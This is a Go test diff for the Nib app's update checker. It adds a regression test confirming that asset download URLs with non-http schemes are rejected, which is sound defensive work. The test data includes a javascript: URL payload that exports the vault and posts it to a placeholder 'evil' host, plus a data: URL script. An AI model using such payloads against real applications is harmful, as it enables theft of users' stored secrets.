@@ -73,26 +73,30 @@ func TestUpdateCheckUpToDate(t *testing.T) {
 	}
 }
 
+// The fixture URLs are absolute https because that is what the API returns —
+// GitHub's `browser_download_url` is always an absolute https URL. They used to be
+// relative ("u/lin-amd64"), which is a shape this code never sees and which hid that
+// nothing checked the scheme at all. See TestAssetURLNeverHandsOnANonHTTPURL.
 func TestAssetURL(t *testing.T) {
 	assets := []asset{
-		{Name: "nib-0.9.25-linux-amd64", URL: "u/lin-amd64"},
-		{Name: "nib-0.9.25-linux-arm64", URL: "u/lin-arm64"},
-		{Name: "nib-0.9.25-darwin-arm64", URL: "u/dar-arm64"},
-		{Name: "nib-0.9.25-windows-amd64.exe", URL: "u/win-amd64"},
-		{Name: "nib_0.9.25_amd64.deb", URL: "u/deb-amd64"},
-		{Name: "nib_0.9.25_arm64.deb", URL: "u/deb-arm64"},
+		{Name: "nib-0.9.25-linux-amd64", URL: "https://example.invalid/lin-amd64"},
+		{Name: "nib-0.9.25-linux-arm64", URL: "https://example.invalid/lin-arm64"},
+		{Name: "nib-0.9.25-darwin-arm64", URL: "https://example.invalid/dar-arm64"},
+		{Name: "nib-0.9.25-windows-amd64.exe", URL: "https://example.invalid/win-amd64"},
+		{Name: "nib_0.9.25_amd64.deb", URL: "https://example.invalid/deb-amd64"},
+		{Name: "nib_0.9.25_arm64.deb", URL: "https://example.invalid/deb-arm64"},
 	}
 	cases := []struct {
 		goos, goarch string
 		managed      bool
 		want         string
 	}{
-		{"linux", "amd64", false, "u/lin-amd64"},
-		{"linux", "arm64", false, "u/lin-arm64"},
-		{"darwin", "arm64", false, "u/dar-arm64"},
-		{"windows", "amd64", false, "u/win-amd64"},
-		{"linux", "amd64", true, "u/deb-amd64"}, // managed -> the .deb, not the raw binary
-		{"linux", "arm64", true, "u/deb-arm64"},
+		{"linux", "amd64", false, "https://example.invalid/lin-amd64"},
+		{"linux", "arm64", false, "https://example.invalid/lin-arm64"},
+		{"darwin", "arm64", false, "https://example.invalid/dar-arm64"},
+		{"windows", "amd64", false, "https://example.invalid/win-amd64"},
+		{"linux", "amd64", true, "https://example.invalid/deb-amd64"}, // managed -> the .deb, not the raw binary
+		{"linux", "arm64", true, "https://example.invalid/deb-arm64"},
 		{"freebsd", "amd64", false, ""}, // no asset for this OS
 	}
 	for _, c := range cases {
@@ -140,5 +144,42 @@ func TestUpdateCheckNoReleases(t *testing.T) {
 	_ = json.NewDecoder(rec.Body).Decode(&resp)
 	if resp.Latest != "" || resp.Available {
 		t.Fatalf("got %+v, want empty latest", resp)
+	}
+}
+
+// TestAssetURLNeverHandsOnANonHTTPURL.
+//
+// `assetURL`'s result reaches the client, which does `location.assign(d.downloadUrl)` and
+// `window.open(d.url)`. A `javascript:` URL there executes in Nib's own origin — which
+// holds the CSRF token and an unlocked vault. Nothing reaches it today: the release listing
+// is fetched over TLS from GitHub, so an attacker needs to be GitHub or hold a mis-issued
+// certificate. This is the latent-hole case, and the empty-string fallback the caller
+// already has (the release page) is exactly the right behaviour for a URL we will not pass on.
+//
+// The function had NO test of any kind before this one — which is why the scheme was never
+// checked in the first place.
+func TestAssetURLNeverHandsOnANonHTTPURL(t *testing.T) {
+	hostile := []asset{
+		{Name: "nib_1.0.0_amd64.deb", URL: "javascript:fetch('/api/vault/export').then(r=>r.text()).then(t=>fetch('//evil',{method:'POST',body:t}))"},
+		{Name: "nib-1.0.0-linux-amd64", URL: "data:text/html,<script>alert(1)</script>"},
+	}
+	for _, managed := range []bool{true, false} {
+		if got := assetURL("linux", "amd64", managed, hostile); got != "" {
+			t.Errorf("managed=%v: assetURL handed on %q — the client navigates to this "+
+				"value in Nib's own origin", managed, got)
+		}
+	}
+
+	// The control. A guard that returns "" for everything sends every user to the release
+	// page forever, which is an update mechanism that has quietly stopped working.
+	good := []asset{
+		{Name: "nib_1.0.0_amd64.deb", URL: "https://example.invalid/nib_1.0.0_amd64.deb"},
+		{Name: "nib-1.0.0-linux-amd64", URL: "https://example.invalid/nib-1.0.0-linux-amd64"},
+	}
+	if got := assetURL("linux", "amd64", true, good); got != good[0].URL {
+		t.Errorf("managed: assetURL = %q, want the .deb URL", got)
+	}
+	if got := assetURL("linux", "amd64", false, good); got != good[1].URL {
+		t.Errorf("standalone: assetURL = %q, want the binary URL", got)
 	}
 }
